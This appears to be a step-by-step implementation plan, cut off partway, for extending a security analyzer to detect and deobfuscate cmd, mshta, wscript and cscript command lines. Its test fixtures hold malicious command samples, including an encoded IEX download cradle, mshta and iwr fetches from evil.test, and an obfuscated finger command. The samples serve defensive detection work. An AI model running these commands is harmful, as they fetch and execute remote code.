# Multi-Interpreter Analyzer Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Extend SOCDesk's deterministic PowerShell-only analyzer core (`shared/analyzer/`) to recognize cmd.exe, mshta, wscript, and cscript as first-class interpreters — detecting each, extracting and deobfuscating its payload, recursing into nested interpreter wrappers, and matching new interpreter-aware signatures — while leaving the existing PowerShell path byte-identical.

**Architecture:** `preprocess.ts` gains an `Interpreter` union and `detectInterpreter()`, then branches its per-interpreter body/target extraction accordingly (cmd `/c`/`/k`, mshta URL/inline-script, wscript/cscript target+flags), with two new leaf modules — `cmdlex.ts` (cmd-gated caret deobfuscation) and `wsh.ts` (WSH/HTA-gated numeric char-code decode) — doing raw-text→raw-text normalization ahead of the existing lex→fold/resolve→extract→classify pipeline. `report.ts`'s `analyze()` gains a depth-capped nested-interpreter re-entry loop (a cmd/mshta/wscript wrapper's inner `powershell -enc` payload is re-detected and decoded) and threads the resolved interpreter into `techniques.ts`'s rule-matching context so new interpreter-aware signatures (`cmd-cradle`, `finger`, mshta, wscript/cscript, WSH honesty notices) can gate on it.

**Tech Stack:** TypeScript, `shared/analyzer`, vitest (`web/vitest.config.ts` globs `../shared/**/*.test.ts` — no config change needed for new test files).

**Spec:** `C:\Users\Carl\Desktop\Projects\VIGIL\docs\superpowers\specs\2026-08-19-multi-interpreter-analyzer-design.md`

## Global Constraints

- PowerShell path stays byte-identical — the existing 86 `shared/analyzer` specs must remain green untouched (the zero-regression guard, spec §1).
- Deterministic, client-side, NEVER executes input — no `eval`/`new Function`/dynamic dispatch, for any interpreter, any stage (spec §7).
- The caret deobfuscator runs ONLY when `interpreter === 'cmd'` — non-negotiable gate (spec §3); PS regex literals like `'^https?://'` must be untouched otherwise.
- Data boundary: a pasted command never reaches `/api/enrich` (spec §7). Reserved-colour law unchanged. Zero AI attribution in any commit/comment/doc.
- Terminology: say "cmd.exe interpreter"/"command-shell interpreter" for the program; reserve "cmd-flag" for PowerShell's own flag grammar (spec §8).

---

## File Structure

- **Create `shared/analyzer/cmdlex.ts`** — `deobfuscateCaret(text: string): string`, a raw-text→raw-text caret normalizer (§3). Separate module because cmd's caret-in-quotes rule is the opposite shape of PowerShell's backtick rule and would corrupt PS literal-safety if folded into `lex.ts`.
- **Create `shared/analyzer/wsh.ts`** — `decodeNumericCharCodes(text: string): string`, a raw-text→raw-text `Chr()`/`fromCharCode()` decoder (§4). Module boundary is an implementation-task decision per spec §4 ("the exact module boundary is an implementation-task decision, not a design decision"); named for symmetry with `cmdlex.ts`'s "separate module per distinct interpreter grammar" precedent.
- **Modify `shared/analyzer/preprocess.ts`** — adds `Interpreter` type + `detectInterpreter()`; widens `preprocess()`'s return with `interpreter`; replaces the single PS-only body-extraction branch with a per-interpreter dispatch (cmd/mshta/wscript/cscript/default); wires `cmdlex.deobfuscateCaret` into the cmd branch only.
- **Modify `shared/analyzer/types.ts`** — `RuleContext` gains `interpreter: Interpreter`.
- **Modify `shared/analyzer/techniques.ts`** — `buildContext()` gains an optional `interpreter` parameter (default `'unknown'`, preserves every existing call site); new rules `cmd-cradle`, `mshta-interpreter`, `wsh-script-exec`, `wsh-decode-limits`, `wsh-concat-eval-present`; broadened `clickfix` decoy list.
- **Modify `shared/analyzer/lolbins.ts`** — new `finger` entry; a comment documenting `start`'s companion-only (never-standalone) status.
- **Modify `shared/analyzer/report.ts`** — threads `interpreter` into the `buildContext()` call; adds the depth-capped `reenterNestedInterpreter()` loop; wires `wsh.decodeNumericCharCodes` in as a new decode layer for the WSH-family interpreters.
- **Modify `shared/analyzer/extract.ts`** — binary-extension denylist guard beside the existing PascalCase `.NET`-member guard.
- **Test:** `shared/analyzer/__tests__/{preprocess,extract,techniques,lolbins,report,integration}.test.ts` (extended) + `shared/analyzer/__tests__/{cmdlex,wsh}.test.ts` (new).

---

### Task 1: Extract IOC-leak fix

**Files:**
- Modify: `shared/analyzer/extract.ts:22-26`
- Test: `shared/analyzer/__tests__/extract.test.ts`

**Interfaces:**
- Consumes: nothing new — `extractIocs(layers: { index: number; text: string | null }[]): ExtractedIoc[]` (existing signature, `extract.ts:11`).
- Produces: same signature, unchanged. No new exports — this is a behavior fix only.

- [ ] **Step 1: Write the failing test**

Add to `shared/analyzer/__tests__/extract.test.ts`, inside the existing `describe('extractIocs', ...)` block:

```ts
  it('does not extract binary filenames (cmd.exe, kernel32.dll, amsi.dll) as domain IOCs', () => {
    const iocs = extractIocs([
      { index: 0, text: 'cmd.exe /c whoami & kernel32.dll amsi.dll' },
    ])
    const raws = iocs.map((i) => i.raw)
    expect(raws).not.toContain('cmd.exe')
    expect(raws).not.toContain('kernel32.dll')
    expect(raws).not.toContain('amsi.dll')
  })

  it('still extracts a URL that ends in a denylisted extension (the denylist only guards the domain branch)', () => {
    const iocs = extractIocs([
      { index: 0, text: "IEX (iwr 'http://evil.test/payload.exe')" },
    ])
    expect(iocs.map((i) => i.raw)).toContain('http://evil.test/payload.exe')
  })
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run shared/analyzer/__tests__/extract.test.ts`
Expected: the first new test FAILS — `raws` contains `'cmd.exe'`, `'kernel32.dll'`, `'amsi.dll'` (today's `detectType` mis-types them as domains and only the PascalCase guard exists). The second new test PASSES already (no regression risk, just documents the boundary).

- [ ] **Step 3: Write minimal implementation**

In `shared/analyzer/extract.ts`, add a module-level denylist and a second guard clause immediately beside the existing PascalCase guard:

```ts
// Binary/script filenames (cmd.exe, kernel32.dll, amsi.dll, a dropped payload.vbs)
// are mis-typed as domains by the shared detectType — a bare lowercase filename
// with a dotted extension satisfies the TLD-agnostic domain regex. Real domains
// don't carry these extensions; URL hosts arrive via the URL branch, unaffected
// by this guard (it only fires on type === 'domain').
const BINARY_EXT_DENYLIST = /\.(?:exe|dll|sys|bat|cmd|scr|ocx|cpl|msi|vbs|ps1|js|hta)$/i
```

and in the loop, immediately after the existing PascalCase guard (`extract.ts:25`):

```ts
      if (type === 'domain' && /[A-Z]/.test(raw)) continue
      if (type === 'domain' && BINARY_EXT_DENYLIST.test(raw)) continue
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run shared/analyzer/__tests__/extract.test.ts`
Expected: PASS, including the pre-existing `'does not extract .NET member-access tokens as domains'` test (untouched guard, still green).

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/extract.ts shared/analyzer/__tests__/extract.test.ts
git commit -m "fix(analyzer): drop binary-extension filenames from domain IOC extraction"
```

---

### Task 2: `detectInterpreter` + `preprocess()`'s `interpreter` field

**Files:**
- Modify: `shared/analyzer/preprocess.ts`
- Modify: `shared/analyzer/types.ts`
- Modify: `shared/analyzer/techniques.ts`
- Modify: `shared/analyzer/report.ts`
- Test: `shared/analyzer/__tests__/preprocess.test.ts`

**Interfaces:**
- Consumes: the existing PS-wrapper-strip regex shape at `preprocess.ts:24` (`/^\s*(?:["']?[^"'\s]*\b)?(?:powershell(?:\.exe)?|pwsh(?:\.exe)?)\b/i`); `RuleContext` (`types.ts:16-22`); `buildContext(text: string, flags: EvasionFlag[]): RuleContext` (`techniques.ts:24`); `preprocess(input: string): { script: string; encoded: string | null; flags: EvasionFlag[] }` (`preprocess.ts:14`); `report.ts:10`'s `const { script, encoded, flags } = preprocess(input)`; `report.ts:79`'s `classify(buildContext(corpus, flags))`.
- Produces:
  - `export type Interpreter = 'powershell' | 'cmd' | 'mshta' | 'wscript' | 'cscript' | 'unknown'` (`preprocess.ts`).
  - `export function detectInterpreter(input: string): Interpreter` (`preprocess.ts`).
  - Widened `export function preprocess(input: string): { script: string; encoded: string | null; flags: EvasionFlag[]; interpreter: Interpreter }`.
  - `RuleContext.interpreter: Interpreter` (`types.ts`).
  - Widened `export function buildContext(text: string, flags: EvasionFlag[], interpreter: Interpreter = 'unknown'): RuleContext` (`techniques.ts`) — every existing 2-arg call site keeps compiling and behaving identically.

- [ ] **Step 1: Write the failing tests**

Add to `shared/analyzer/__tests__/preprocess.test.ts`:

```ts
import { detectInterpreter, preprocess } from '../preprocess'

describe('detectInterpreter', () => {
  it('detects each interpreter from its leading token', () => {
    expect(detectInterpreter('powershell.exe -nop -enc AAAA')).toBe('powershell')
    expect(detectInterpreter('pwsh -File x.ps1')).toBe('powershell')
    expect(detectInterpreter('cmd.exe /c whoami')).toBe('cmd')
    expect(detectInterpreter('cmd /c whoami')).toBe('cmd')
    expect(detectInterpreter('mshta http://evil.test/x.hta')).toBe('mshta')
    expect(detectInterpreter('wscript C:\\Users\\Public\\a.vbs')).toBe('wscript')
    expect(detectInterpreter('cscript //E:jscript a.js')).toBe('cscript')
  })

  it('falls back to unknown for anything else', () => {
    expect(detectInterpreter('Get-Process | Stop-Process')).toBe('unknown')
    expect(detectInterpreter('whoami /all')).toBe('unknown')
  })

  it('survives a quoted System32 path prefix', () => {
    expect(detectInterpreter('"C:\\Windows\\System32\\cmd.exe" /c whoami')).toBe('cmd')
  })
})

describe('preprocess() interpreter field — zero regression on the PS path', () => {
  it('a plain PowerShell input\'s script/encoded/flags are byte-identical to before the interpreter field existed', () => {
    const r = preprocess('powershell.exe -NoP -W Hidden -Ep Bypass -enc AAAAAAAA')
    expect(r.script).toBe('')
    expect(r.encoded).toBe('AAAAAAAA')
    expect(r.flags.map((f) => f.flag).sort()).toEqual(['-enc', '-ep', '-nop', '-w'])
    expect(r.interpreter).toBe('powershell')
  })

  it('an un-prefixed script (unknown interpreter) is byte-identical to before', () => {
    const r = preprocess("IEX (New-Object Net.WebClient).DownloadString('http://a/x')")
    expect(r.encoded).toBeNull()
    expect(r.script).toContain('DownloadString')
    expect(r.flags).toEqual([])
    expect(r.interpreter).toBe('unknown')
  })
})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run shared/analyzer/__tests__/preprocess.test.ts`
Expected: FAIL — `detectInterpreter` is not exported yet; `r.interpreter` is `undefined`.

- [ ] **Step 3: Write minimal implementation**

In `shared/analyzer/preprocess.ts`, add the type and detector above `preprocess()`:

```ts
export type Interpreter = 'powershell' | 'cmd' | 'mshta' | 'wscript' | 'cscript' | 'unknown'

// Same path/quote-prefix shape as the PS-wrapper strip below — a leading token
// optionally preceded by a quoted/unquoted path, then the interpreter binary
// name. Order = specificity: check the four new interpreters before falling
// back to powershell/pwsh.
const INTERPRETER_RE: { interpreter: Interpreter; re: RegExp }[] = [
  { interpreter: 'cmd', re: /^\s*(?:["']?[^"'\s]*\b)?cmd(?:\.exe)?\b/i },
  { interpreter: 'mshta', re: /^\s*(?:["']?[^"'\s]*\b)?mshta(?:\.exe)?\b/i },
  { interpreter: 'wscript', re: /^\s*(?:["']?[^"'\s]*\b)?wscript(?:\.exe)?\b/i },
  { interpreter: 'cscript', re: /^\s*(?:["']?[^"'\s]*\b)?cscript(?:\.exe)?\b/i },
  { interpreter: 'powershell', re: /^\s*(?:["']?[^"'\s]*\b)?(?:powershell(?:\.exe)?|pwsh(?:\.exe)?)\b/i },
]

export function detectInterpreter(input: string): Interpreter {
  for (const { interpreter, re } of INTERPRETER_RE) {
    if (re.test(input)) return interpreter
  }
  return 'unknown'
}
```

Widen `preprocess()`'s return type and body (script-computation logic is UNCHANGED in this task — only the `interpreter` field is added):

```ts
export function preprocess(input: string): { script: string; encoded: string | null; flags: EvasionFlag[]; interpreter: Interpreter } {
  const flags: EvasionFlag[] = []
  let encoded: string | null = null
  for (const rule of FLAG_RULES) {
    const m = input.match(rule.re)
    if (!m) continue
    flags.push({ flag: rule.flag, raw: m[0].trim(), techniqueIds: rule.techniqueIds })
    if (rule.flag === '-enc' && m[1]) encoded = m[1]
  }
  const interpreter = detectInterpreter(input)
  // Strip a leading powershell(.exe)/pwsh invocation wrapper; keep the -Command body if present.
  // (per-interpreter body extraction lands in Task 3 — unchanged here.)
  let script = input.replace(/^\s*(?:["']?[^"'\s]*\b)?(?:powershell(?:\.exe)?|pwsh(?:\.exe)?)\b/i, '')
  const cmd = script.match(/-c(?:ommand)?\s+(.*)$/is)
  if (cmd) script = cmd[1]
  return { script: script.trim(), encoded, flags, interpreter }
}
```

In `shared/analyzer/types.ts`, add the import and widen `RuleContext` (near `types.ts:1-2` and `:16-22`):

```ts
import type { IndicatorType } from '../indicators'
import type { Token } from './lex'
import type { Interpreter } from './preprocess'
```

```ts
export interface RuleContext {
  text: string           // decoded corpus (raw script + every resolved layer.text)
  lower: string          // text.toLowerCase()
  tokens: Token[]        // tokenize(text)
  words: string[]        // lowercased bareword + string token values
  flags: EvasionFlag[]   // outer command-line evasion flags from preprocess
  interpreter: Interpreter // resolved interpreter (post nested-reentry); 'unknown' for existing PS-only call sites
}
```

In `shared/analyzer/techniques.ts`, widen `buildContext` (`techniques.ts:24-30`) — import `Interpreter` and default the new parameter so every existing 2-arg call site (tests, `report.ts` before Task 2's own change below) keeps compiling:

```ts
import type { EvasionFlag, RuleContext, Signal, Specificity } from './types'
import type { Interpreter } from './preprocess'
import { tokenize } from './lex'
import { matchLolbin } from './lolbins'
```

```ts
export function buildContext(text: string, flags: EvasionFlag[], interpreter: Interpreter = 'unknown'): RuleContext {
  const tokens = tokenize(text)
  const words = tokens
    .filter((t) => t.type === 'bareword' || t.type === 'string')
    .map((t) => t.value.toLowerCase())
  return { text, lower: text.toLowerCase(), tokens, words, flags, interpreter }
}
```

In `shared/analyzer/report.ts`, destructure the new field and thread it through the existing `buildContext` call (`report.ts:10` and `:79`):

```ts
  const { script, encoded, flags, interpreter } = preprocess(input)
```

```ts
  const signals = classify(buildContext(corpus, flags, interpreter))
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run shared/analyzer/__tests__/preprocess.test.ts` then the full suite: `npx vitest run`
Expected: PASS. All pre-existing 86 specs stay green (the PS-path script/encoded/flags computation is untouched; `buildContext`'s new parameter is optional).

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/preprocess.ts shared/analyzer/types.ts shared/analyzer/techniques.ts shared/analyzer/report.ts shared/analyzer/__tests__/preprocess.test.ts
git commit -m "feat(analyzer): add interpreter detection to preprocess()"
```

---

### Task 3: Per-interpreter body/target extraction + WSH flag rules

**Files:**
- Modify: `shared/analyzer/preprocess.ts`
- Test: `shared/analyzer/__tests__/preprocess.test.ts`

**Interfaces:**
- Consumes: `Interpreter`, `detectInterpreter()` (Task 2); `EvasionFlag` (`types.ts`).
- Produces: `preprocess()`'s `script` field now reflects real per-interpreter extraction (same outer signature as Task 2). Internal, non-exported helpers `extractCmdBody(input: string): string`, `extractMshtaBody(input: string): string`, `extractWshBody(input: string, flags: EvasionFlag[]): string` (mutates `flags` via `push`) — Task 4/5 will read/extend `extractCmdBody`.

- [ ] **Step 1: Write the failing tests**

Add to `shared/analyzer/__tests__/preprocess.test.ts`:

```ts
describe('per-interpreter body/target extraction', () => {
  it('cmd: extracts the /c body', () => {
    expect(preprocess('cmd /c whoami').script).toBe('whoami')
  })

  it('cmd: extracts the /k body, surviving a quoted path prefix', () => {
    expect(preprocess('"C:\\Windows\\System32\\cmd.exe" /k dir').script).toBe('dir')
  })

  it('mshta: extracts a URL target', () => {
    expect(preprocess('mshta http://evil.test/x.hta').script).toBe('http://evil.test/x.hta')
  })

  it('mshta: extracts an inline vbscript: target', () => {
    const r = preprocess('mshta vbscript:CreateObject("WScript.Shell").Run("calc.exe")(window.close)')
    expect(r.script).toContain('CreateObject')
    expect(r.script.startsWith('vbscript:')).toBe(true)
  })

  it('wscript: extracts the .vbs target and //E:/,//NoLogo flags', () => {
    const r = preprocess('wscript //E:vbscript //NoLogo C:\\Users\\Public\\payload.vbs')
    expect(r.script).toBe('C:\\Users\\Public\\payload.vbs')
    const flagNames = r.flags.map((f) => f.flag)
    expect(flagNames).toContain('//E:vbscript')
    expect(flagNames).toContain('//NoLogo')
  })

  it('cscript: extracts the .js target and //E:jscript flag', () => {
    const r = preprocess('cscript //E:jscript malicious.js')
    expect(r.script).toBe('malicious.js')
    expect(r.flags.map((f) => f.flag)).toContain('//E:jscript')
  })
})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run shared/analyzer/__tests__/preprocess.test.ts`
Expected: FAIL — cmd/mshta/wscript/cscript inputs currently fall through to the unchanged PS-stripping branch, which does nothing to a non-PS-prefixed string, so `script` still equals the raw (trimmed) input.

- [ ] **Step 3: Write minimal implementation**

In `shared/analyzer/preprocess.ts`, add the WSH flag table and three extraction helpers above `preprocess()`:

```ts
// WSH-scoped flag rules — structurally the same shape as FLAG_RULES, gated to
// only ever be checked from the wscript/cscript branch below so they can never
// collide with PowerShell's own -w/-nop/etc.
const WSH_FLAG_RULES: { flag: string; re: RegExp; techniqueIds: string[] }[] = [
  { flag: '//E:vbscript', re: /\/\/E:vbscript\b/i, techniqueIds: ['T1059.005'] },
  { flag: '//E:jscript', re: /\/\/E:jscript\b/i, techniqueIds: ['T1059.007'] },
  { flag: '//B', re: /\/\/B\b/i, techniqueIds: ['T1564.003'] },
  { flag: '//NoLogo', re: /\/\/NoLogo\b/i, techniqueIds: ['T1564.003'] },
]

// Extract the /c or /k body, mirroring the shape of the existing -Command
// extraction: match a flag, take the rest of the line.
function extractCmdBody(input: string): string {
  const m = input.match(/\/(?:c|k)\s+(.*)$/is)
  return (m ? m[1] : input).trim()
}

// The argument itself IS the payload: a URL, a local .hta path, or an inline
// vbscript:/javascript: scheme. Strip only the leading mshta(.exe) token.
function extractMshtaBody(input: string): string {
  const m = input.match(/^\s*(?:["']?[^"'\s]*\b)?mshta(?:\.exe)?\b\s*(.*)$/is)
  return (m ? m[1] : input).trim()
}

// Extract the .vbs/.js target (or inline target) and recognize //E:/-B/-NoLogo
// as evasion/config flags, pushed into the shared `flags` array.
function extractWshBody(input: string, flags: EvasionFlag[]): string {
  for (const rule of WSH_FLAG_RULES) {
    const m = input.match(rule.re)
    if (!m) continue
    flags.push({ flag: rule.flag, raw: m[0].trim(), techniqueIds: rule.techniqueIds })
  }
  const stripped = input
    .replace(/^\s*(?:["']?[^"'\s]*\b)?(?:wscript(?:\.exe)?|cscript(?:\.exe)?)\b/i, '')
    .replace(/\/\/\S+/g, '')
  return stripped.trim()
}
```

Replace `preprocess()`'s script-computation block with a dispatch on `interpreter`:

```ts
  const interpreter = detectInterpreter(input)
  let script: string
  if (interpreter === 'cmd') {
    script = extractCmdBody(input)
  } else if (interpreter === 'mshta') {
    script = extractMshtaBody(input)
  } else if (interpreter === 'wscript' || interpreter === 'cscript') {
    script = extractWshBody(input, flags)
  } else {
    // powershell / unknown — unchanged from Task 2/pre-increment behavior.
    let s = input.replace(/^\s*(?:["']?[^"'\s]*\b)?(?:powershell(?:\.exe)?|pwsh(?:\.exe)?)\b/i, '')
    const cmd = s.match(/-c(?:ommand)?\s+(.*)$/is)
    if (cmd) s = cmd[1]
    script = s
  }
  return { script: script.trim(), encoded, flags, interpreter }
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run shared/analyzer/__tests__/preprocess.test.ts` then `npx vitest run`
Expected: PASS, including Task 2's zero-regression fixtures (the `else` branch is byte-identical to the pre-Task-3 code).

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/preprocess.ts shared/analyzer/__tests__/preprocess.test.ts
git commit -m "feat(analyzer): per-interpreter body/target extraction for cmd, mshta, wscript, cscript"
```

---

### Task 4: Nested interpreter re-entry (recursive, depth-capped)

**Files:**
- Modify: `shared/analyzer/report.ts`
- Test: `shared/analyzer/__tests__/integration.test.ts`

**Interfaces:**
- Consumes: `preprocess()`, `Interpreter` (Task 2/3); `EvasionFlag` (`types.ts`); the existing `analyze()` layer-construction shape (`report.ts:9-31`, `DecodedLayer`).
- Produces: internal (non-exported) `reenterNestedInterpreter(outerInterpreter: Interpreter, outerScript: string): { script: string; encoded: string | null; flags: EvasionFlag[]; finalInterpreter: Interpreter; layers: { transform: string; text: string }[] }` and `WRAPPER_INTERPRETERS: Set<Interpreter>` in `report.ts`. `analyze()`'s public signature/return type (`AnalysisResult`) is unchanged — `layers` simply gains new entries for wrapped input.

- [ ] **Step 1: Write the failing tests**

Add to `shared/analyzer/__tests__/integration.test.ts`:

```ts
describe('nested interpreter re-entry (§2.1)', () => {
  it('cmd /c powershell -w hidden -enc <b64> decodes the inner blob and matches the top-level PS result', async () => {
    const enc = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOQAuADEANAA4AC4AMgAwAC8AYQAuAHAAcwAxACcAKQA='
    const wrapped = await analyze('cmd /c powershell -w hidden -enc ' + enc)
    const topLevel = await analyze('powershell -w hidden -enc ' + enc)
    expect(wrapped.signals.map((s) => s.id).sort()).toEqual(topLevel.signals.map((s) => s.id).sort())
    expect(wrapped.iocs.map((i) => i.raw).sort()).toEqual(topLevel.iocs.map((i) => i.raw).sort())
    expect(wrapped.layers.some((l) => l.transform.includes('cmd→powershell'))).toBe(true)
  })

  it('a pathological wrapper-in-wrapper terminates at the depth cap instead of spinning', async () => {
    const deep = 'cmd /c cmd /c cmd /c cmd /c cmd /c cmd /c cmd /c cmd /c whoami'
    const r = await analyze(deep)
    const cmdHops = r.layers.filter((l) => l.transform.includes('cmd→cmd'))
    expect(cmdHops.length).toBe(4) // NESTED_REENTRY_MAX_DEPTH
    expect(r.layers[r.layers.length - 1].text).toContain('cmd /c') // did NOT fully unwrap — the cap stopped it
  })
})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run shared/analyzer/__tests__/integration.test.ts`
Expected: FAIL — today `cmd /c powershell -w hidden -enc <b64>` still decodes (FLAG_RULES scans raw input unconditionally for `-enc`), but `wrapped.layers` never contains a `'cmd→powershell'`-named transform, so the `.some(...)` assertion fails; the depth-cap test fails because no `'cmd→cmd'` hop layers exist yet at all.

- [ ] **Step 3: Write minimal implementation**

In `shared/analyzer/report.ts`, widen the type import (`report.ts:1`) and add the interpreter imports:

```ts
import type { AnalysisResult, Characterization, DecodedLayer, EvasionFlag, Signal } from './types'
import { preprocess, type Interpreter } from './preprocess'
```

Add the wrapper set, depth cap, and re-entry function above `analyze()`:

```ts
const WRAPPER_INTERPRETERS = new Set<Interpreter>(['cmd', 'mshta', 'wscript', 'cscript'])
const NESTED_REENTRY_MAX_DEPTH = 4

/** cmd/mshta/wscript/cscript wrappers overwhelmingly exist to launch a NESTED
 *  interpreter (canonically `cmd /c powershell -w hidden -enc <blob>`). Loop
 *  the extracted body back through preprocess() so a nested powershell -enc/
 *  -Command payload is decoded exactly as a top-level PowerShell input would
 *  be — depth-capped (plus a seen-set for cycle detection) so a hostile
 *  wrapper-in-wrapper cannot spin the analyzer, the same discipline the
 *  IEX-recursion loop below already applies. Each hop is recorded as its own
 *  decode-ladder layer naming the transition, e.g. `cmd→powershell`. */
function reenterNestedInterpreter(
  outerInterpreter: Interpreter,
  outerScript: string,
): { script: string; encoded: string | null; flags: EvasionFlag[]; finalInterpreter: Interpreter; layers: { transform: string; text: string }[] } {
  const hopLayers: { transform: string; text: string }[] = []
  let fromInterpreter = outerInterpreter
  let script = outerScript
  let encoded: string | null = null
  let flags: EvasionFlag[] = []
  const seen = new Set<string>([outerScript])
  for (let depth = 0; depth < NESTED_REENTRY_MAX_DEPTH; depth++) {
    if (!WRAPPER_INTERPRETERS.has(fromInterpreter)) break
    const inner = preprocess(script)
    if (seen.has(inner.script) || inner.interpreter === 'unknown') break
    seen.add(inner.script)
    hopLayers.push({ transform: `${fromInterpreter}→${inner.interpreter}${inner.encoded ? ' -enc' : ''}`, text: inner.script })
    script = inner.script
    encoded = inner.encoded
    flags = flags.concat(inner.flags)
    fromInterpreter = inner.interpreter
    if (fromInterpreter === 'powershell') break // reached PS: the existing -enc/layer logic below takes over
  }
  return { script, encoded, flags, finalInterpreter: fromInterpreter, layers: hopLayers }
}
```

In `analyze()`, insert the re-entry step right after `preprocess(input)` (`report.ts:10-11`):

```ts
export async function analyze(input: string): Promise<AnalysisResult> {
  const outer = preprocess(input)
  let { script, encoded, flags } = outer
  let interpreter = outer.interpreter
  const layers: DecodedLayer[] = []

  if (WRAPPER_INTERPRETERS.has(interpreter)) {
    const reentered = reenterNestedInterpreter(interpreter, script)
    for (const hop of reentered.layers) {
      layers.push({ index: layers.length, transform: hop.transform, text: hop.text, state: 'fully-decoded' })
    }
    script = reentered.script
    encoded = reentered.encoded
    flags = flags.concat(reentered.flags)
    interpreter = reentered.finalInterpreter
  }

  // Layer N: -enc Base64 → UTF-16LE. (unchanged below, now seeded from the
  // possibly-nested script/encoded.)
  let current = script
  if (encoded) {
```

The rest of `analyze()` (from the existing `if (encoded) { ... }` body through the return statement) is unchanged in this task; `classify(buildContext(corpus, flags, interpreter))` (`report.ts:79`, already threading `interpreter` since Task 2) now receives the FINAL (post-reentry) interpreter, not just the outer one.

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run shared/analyzer/__tests__/integration.test.ts` then `npx vitest run`
Expected: PASS. For `interpreter === 'powershell'`/`'unknown'`, `WRAPPER_INTERPRETERS.has(interpreter)` is false, so the new block is skipped entirely and `script`/`encoded`/`flags` are byte-identical to before — the 86 pre-existing specs stay green.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/report.ts shared/analyzer/__tests__/integration.test.ts
git commit -m "feat(analyzer): recursive depth-capped nested-interpreter re-entry"
```

---

### Task 5: `cmdlex.ts` caret deobfuscation, cmd-gated

**Files:**
- Create: `shared/analyzer/cmdlex.ts`
- Modify: `shared/analyzer/preprocess.ts`
- Test: `shared/analyzer/__tests__/cmdlex.test.ts` (new)
- Test: `shared/analyzer/__tests__/preprocess.test.ts` (extended — the gating test)

**Interfaces:**
- Consumes: nothing (pure string→string function).
- Produces: `export function deobfuscateCaret(text: string): string` (`cmdlex.ts`). Task 3's `extractCmdBody` (in `preprocess.ts`) is the ONLY call site.

- [ ] **Step 1: Write the failing tests**

Create `shared/analyzer/__tests__/cmdlex.test.ts`:

```ts
// shared/analyzer/__tests__/cmdlex.test.ts
import { describe, expect, it } from 'vitest'
import { deobfuscateCaret } from '../cmdlex'
import { preprocess } from '../preprocess'

describe('deobfuscateCaret', () => {
  it('collapses ^^ to ^ outside quotes', () => {
    expect(deobfuscateCaret('sometext^^more')).toBe('sometext^more')
  })

  it('drops a bare ^ outside quotes, keeping the next character literally', () => {
    expect(deobfuscateCaret('f^inger user@45.9.148.20')).toBe('finger user@45.9.148.20')
    expect(deobfuscateCaret('p^o^w^e^r^s^h^e^l^l')).toBe('powershell')
  })

  it('leaves carets untouched inside "..."', () => {
    expect(deobfuscateCaret('"^https?://"')).toBe('"^https?://"')
  })

  it('caret-processes inside a for /f \'list\' single-quoted segment (not a cmd string-literal quote)', () => {
    const input = "for /f %e in ('f^inger user@45.9.148.20') do %e"
    expect(deobfuscateCaret(input)).toBe("for /f %e in ('finger user@45.9.148.20') do %e")
  })

  it('a trailing ^ at end-of-line is a line-continuation marker — does not consume past EOL', () => {
    expect(deobfuscateCaret('echo hi^')).toBe('echo hi^')
    expect(deobfuscateCaret('echo hi^\r\nmore')).toBe('echo hi^\r\nmore')
  })
})

describe('the non-negotiable interpreter gate', () => {
  it('a PowerShell regex literal with a caret is byte-identical when interpreter !== cmd', () => {
    const input = "Where-Object { $_.Path -match '^https?://' }"
    const r = preprocess(input)
    expect(r.interpreter).not.toBe('cmd')
    expect(r.script).toContain("'^https?://'")
  })
})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run shared/analyzer/__tests__/cmdlex.test.ts`
Expected: FAIL — `../cmdlex` doesn't exist yet (module-not-found). The gating test in the same file currently passes trivially (nothing strips carets anywhere yet) — that's expected; it becomes the regression guard once `cmdlex.ts` exists.

- [ ] **Step 3: Write minimal implementation**

Create `shared/analyzer/cmdlex.ts`:

```ts
// shared/analyzer/cmdlex.ts
//
// cmd.exe caret (^) deobfuscation — a raw-text→raw-text normalizer, NOT a
// tokenizer. cmd's caret rule has the opposite quote-scoping shape from
// PowerShell's backtick rule (PS: backtick escapes inside nothing special;
// cmd: caret is suppressed INSIDE double quotes), so it cannot be folded into
// lex.ts's token stream without corrupting PS literal-safety — it must be a
// separate module.
//
// NON-NEGOTIABLE: this module's normalizer is invoked ONLY from preprocess.ts's
// cmd body-extraction branch (interpreter === 'cmd'). Never call it from any
// other interpreter's path, including 'unknown' — running caret-stripping on
// PowerShell text corrupts legitimate regex literals such as '^https?://'.

/** Track double-quote parity only — single quotes are not tracked at all
 *  (cmd does not caret-process inside "…", but it DOES caret-process inside a
 *  for /f's '…' list, which is a list delimiter, not a cmd string-literal
 *  quote). Outside "…": ^^ -> ^; a bare ^ is dropped and the next character is
 *  kept literally (mirrors lex.ts:56-57's backtick no-op-escape mechanic,
 *  keyed on ^ instead of `). Inside "…": carets are left untouched. A
 *  trailing ^ at end-of-line is a line-continuation marker, not a
 *  per-character escape — it must not consume past EOL into a synthetic next
 *  character. */
export function deobfuscateCaret(text: string): string {
  let out = ''
  let inDouble = false
  let i = 0
  const n = text.length
  while (i < n) {
    const c = text[i]
    if (c === '"') { inDouble = !inDouble; out += c; i++; continue }
    if (!inDouble && c === '^') {
      const next = text[i + 1]
      if (next === undefined || next === '\n' || next === '\r') { out += c; i++; continue }
      if (next === '^') { out += '^'; i += 2; continue }
      out += next; i += 2; continue
    }
    out += c; i++
  }
  return out
}
```

In `shared/analyzer/preprocess.ts`, import `deobfuscateCaret` and wire it into `extractCmdBody` (Task 3's function — this is the single call site):

```ts
